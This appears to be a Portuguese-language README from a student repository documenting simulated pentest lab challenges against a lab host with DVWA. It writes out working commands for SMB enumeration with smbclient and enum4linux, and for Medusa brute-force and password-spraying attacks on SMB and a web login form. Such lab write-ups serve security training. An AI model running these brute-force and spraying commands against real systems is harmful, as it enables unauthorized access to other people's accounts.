Relatório de Execução dos Desafios de Segurança

Este repositório contém a documentação, comandos e arquivos utilizados durante a realização dos desafios práticos de testes de segurança e pentest simulado.

📁 Estrutura do Repositório

O projeto está organizado da seguinte forma:

.
├── README.md             # Documentação detalhada das atividades executadas
├── smb_users.txt         # Wordlist de usuários gerada para enumeração e testes em SMB
├── enum4_output.txt      # Log completo da saída do comando enum4linux
└── /images               # Capturas de tela organizadas comprovando a execução dos desafios


🎯 Objetivos Realizados

Durante a execução dos desafios, foram realizados os seguintes procedimentos:

Enumeração de Usuários e Serviços: Coleta de informações detalhadas sobre a rede e compartilhamentos de arquivos via SMB.

Ataques Simulados:

Força bruta em serviço FTP.

Automação de tentativas de autenticação em formulário web (DVWA).

Password spraying em serviço SMB com base em lista de usuários identificados.

🛠️ Comandos Utilizados

Abaixo estão registrados os comandos executados durante o desenvolvimento dos desafios:

1. Criação de Wordlist Customizada

Comando utilizado para gerar a lista de usuários potenciais para os testes de autenticação:

echo -e "user\nmsfadmin\nservice" > smb_users.txt


2. Enumeração de Recursos SMB

Verificação de acessos e listagem de compartilhamentos no serviço SMB do alvo:

smbclient -L //192.168.1.X -U username


3. Ataque de Força Bruta e Password Spraying (Medusa)

Execução de automação de testes de senha utilizando os módulos específicos de validação:

medusa -h 192.168.1.X -U smb_users.txt -P passwords.txt -M smb


Exemplo para automação de formulário web (DVWA):

medusa -h 192.168.1.X -U smb_users.txt -P passwords.txt -M web-form \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6


4. Enumeração Completa do Alvo (enum4linux)

Execução da coleta automatizada de informações do serviço SMB e redirecionamento da saída para arquivo de log:

enum4linux -a 192.168.1.X | tee enum4_output.txt


5. Análise de Logs Gerados

Visualização e leitura do relatório gerado pela enumeração:

less enum4_output.txt


🖼️ Evidências (Capturas de Tela)

As imagens com as evidências da execução de cada etapa estão salvas no diretório /images:

images/enum4linux_execution.png: Execução da enumeração de usuários.

images/medusa_bruteforce.png: Automação das tentativas de login.

images/smbclient_access.png: Validação dos acessos no SMB.
